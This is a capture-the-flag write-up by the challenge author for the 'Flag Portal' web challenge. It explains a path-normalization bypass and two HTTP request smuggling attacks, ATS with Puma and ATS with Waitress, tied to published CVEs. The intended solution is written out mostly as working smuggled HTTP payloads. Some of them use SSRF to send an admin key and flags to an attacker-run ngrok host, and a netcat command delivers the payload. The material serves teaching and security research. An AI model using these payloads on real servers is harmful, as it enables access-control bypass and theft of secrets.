# Flag Portal - Solution

**Author**: zeyu2001

**Category**: Web

## Unintended Solution

While `/api/flag-plz` is mapped to `/forbidden`, the `/api` prefix is still mapped to `/`.

```
map /api/flag-plz   http://backend/forbidden
map /api            http://backend/
map /admin          http://flagportal/forbidden
map /               http://flagportal/
```

This means that `http://flagportal.chall.seetf.sg:10001/api//flag-plz` will be mapped to `http://backend//flag-plz`, which is normalized to `http://backend/flag-plz`.

## Intended Solution

2 HTTP request smuggling vulns.

### 1) Between ATS and Puma

Conditions that make this possible:

- ATS interprets `"chunked"` as `chunked`
- Puma ignores invalid / unsupported TE values

First, we need to smuggle a request to `/admin` in `flagportal` to perform an SSRF.

```http
GET / HTTP/1.1
Host: example.com
Transfer-Encoding: "chunked"

DELETE /admin?backend=http://f754-42-60-216-15.ngrok.io HTTP/1.1
Host: example.com
Padding: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0: x

```

Here's how this works.

For ATS:

- ATS interprets `"chunked"` as `chunked`.
- It sees the first two characters of `DELETE`, and interprets `0xDE` as the chunk size.
- Using the padding header, we add enough bytes so that we have `0xDE` bytes when we reach `0: x`.
- The `0: x` line is parsed as the chunk terminator.
- ATS only sees one request, `GET /`.

For Puma:

- Puma ignores the invalid `"chunked"` transfer encoding.
- The content length of the first request is then 0.
- Puma sees two requests, `GET /` and `DELETE /admin`.

By hosting our own server, we can catch the request, including the `Admin-Key`.

```http
POST / HTTP/1.1
Host: f754-42-60-216-15.ngrok.io
User-Agent: Ruby
Content-Length: 37
Accept: */*
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Admin-Key: spendable-snoring-character-ditzy-sepia-lazily
Content-Type: application/x-www-form-urlencoded
First-Flag: SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}
X-Forwarded-For: 42.60.216.15
X-Forwarded-Proto: http

target=https%3A%2F%2Fbit.ly%2F3jzERNa
```

This gives us the first flag, `SEE{n0w_g0_s0lv3_th3_n3xt_p4rt_bf38678e8a1749802b381aa0d36889e8}`.

Note that with the above request smuggling method, we won't be able to get the second response from Puma, which is why there are two parts to this challenge. ATS will only show the first response even if we add more requests after the `DELETE` request above.

### 2) Between ATS and Waitress

Conditions that make this possible:

- ATS processes LF as line endings (instead of CRLF)
- Waitress allows LF in chunked extensions

```http
GET /api HTTP/1.1
Host: backend
Transfer-Encoding: chunked

2;[\n]xx
d9
0

POST /flag-plz HTTP/1.1
Host: backend
ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

target=http://f754-42-60-216-15.ngrok.io

0

```

Notice a `\n` is added to the chunk extension. Since ATS processes the LF as the end-of-line, it sees the following:

```http
GET /api HTTP/1.1
Host: backend
Transfer-Encoding: chunked

2
xx
d9
0

POST /flag-plz HTTP/1.1
Host: backend
ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

target=http://f754-42-60-216-15.ngrok.io

0

```

The second request is encapsulated in the chunked content of the first request.

Waitress, on the other hand, would see both requests:

```http
GET /api HTTP/1.1
Host: backend
Transfer-Encoding: chunked

2
d9
0

POST /flag-plz HTTP/1.1
Host: backend
ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

target=http://f754-42-60-216-15.ngrok.io

0

```

`python3 payload.py | nc localhost 8000`

From our receiving server, we can see the flag: `SEE{y4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9}`

```http
POST / HTTP/1.1
Host: f754-42-60-216-15.ngrok.io
User-Agent: python-requests/2.27.1
Content-Length: 106
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 42.60.216.15
X-Forwarded-Proto: http

flag=SEE%7By4y_r3qu3st_smuggl1ng_1s_fun_e28557a604fb011a89546a7fdb743fe9%7D&congrats=Thanks+for+playing%21
```

### Credits

- Thesis by Matthias Grenfeldt and Asta Olofsson where they investigated ATS in-depth. The vulnerabilities on the ATS-side of things in this challenge were discovered by them and detailed in this thesis.

<http://kth.diva-portal.org/smash/get/diva2:1596031/FULLTEXT01.pdf>

- For Puma and Waitress, these were vulnerabilities I found when researching on web servers and request smuggling.
  - CVE-2022-24790: <https://github.com/puma/puma/security/advisories/GHSA-h99w-9q5r-gjq9>
  - CVE-2022-24761: <https://github.com/Pylons/waitress/security/advisories/GHSA-4f7p-27jc-3c36>
